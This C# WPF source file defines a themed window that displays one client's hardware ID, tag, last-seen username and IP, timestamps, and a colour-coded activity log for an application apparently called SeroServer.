using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using DevExpress.Xpf.Core;
using SeroServer.Data;

namespace SeroServer.UI;

public partial class ClientLogWindow : ThemedWindow
{
    // Mid-tone semantic colors — legible on both dark and light backgrounds.
    private static readonly Brush _brError   = Frozen(0xDC, 0x26, 0x26); // red-600
    private static readonly Brush _brConnect = Frozen(0x16, 0xA3, 0x4A); // green-600
    private static readonly Brush _brDisconn = Frozen(0xD9, 0x77, 0x06); // amber-600

    private static Brush Frozen(byte r, byte g, byte b)
    {
        var b2 = new SolidColorBrush(Color.FromRgb(r, g, b));
        b2.Freeze();
        return b2;
    }

    private static Brush ResOrFrozen(string key, byte r, byte g, byte b)
    {
        if (Application.Current?.Resources[key] is Brush resolved) return resolved;
        return Frozen(r, g, b);
    }

    public ClientLogWindow(ClientRecord record)
    {
        InitializeComponent();
        TxtTitle.Text = $"— {record.LastUsername}@{record.LastIP} ({record.Hwid[..8]}...)";

        // Resolve body text colors from the current theme — adapts to light/dark.
        var brDefault = ResOrFrozen("ContentTextBrush", 0xB8, 0xC0, 0xD8);
        var brDim     = ResOrFrozen("FieldLabelBrush",  0x60, 0x68, 0x80);
        var brHeader  = ResOrFrozen("AccentBrush",      0x3B, 0x82, 0xF6);

        var para = new Paragraph { Margin = new Thickness(0) };
        TxtLog.Document.Blocks.Clear();
        TxtLog.Document.Blocks.Add(para);

        void Add(string text, Brush brush) =>
            para.Inlines.Add(new Run(text) { Foreground = brush });

        Add($"HWID:       {record.Hwid}\n",       brHeader);
        Add($"Tag:        {(string.IsNullOrEmpty(record.Tag) ? "(none)" : record.Tag)}\n", brDim);
        string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "yyyy-MM-dd h:mm:ss tt" : "yyyy-MM-dd h:mm tt";
        Add($"First Seen: {record.FirstSeen.ToString(timeFmt)}\n", brDim);
        Add($"Last Seen:  {record.LastSeen.ToString(timeFmt)}\n",  brDim);
        Add(new string('─', 50) + "\n\n", brDim);

        foreach (var entry in record.ActivityLog.AsEnumerable().Reverse().Take(200))
        {
            var line = $"[{entry.Time.ToString(timeFmt)}] {entry.Action}\n";
            var brush = entry.Action.Contains("connect", StringComparison.OrdinalIgnoreCase)
                            && !entry.Action.Contains("disconnect", StringComparison.OrdinalIgnoreCase)
                ? _brConnect
                : entry.Action.Contains("disconnect", StringComparison.OrdinalIgnoreCase) ? _brDisconn
                : entry.Action.Contains("error",  StringComparison.OrdinalIgnoreCase)
                  || entry.Action.Contains("fail", StringComparison.OrdinalIgnoreCase) ? _brError
                : brDefault;
            Add(line, brush);
        }

        TxtLog.ScrollToEnd();
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) => Lang.LanguageChanged -= ApplyLanguage;
    }

    private void ApplyLanguage() { this.Title = Lang.Get("FEAT_CLIENT_LOGS"); }

    private void Close_Click(object sender, RoutedEventArgs e) => Close();
}
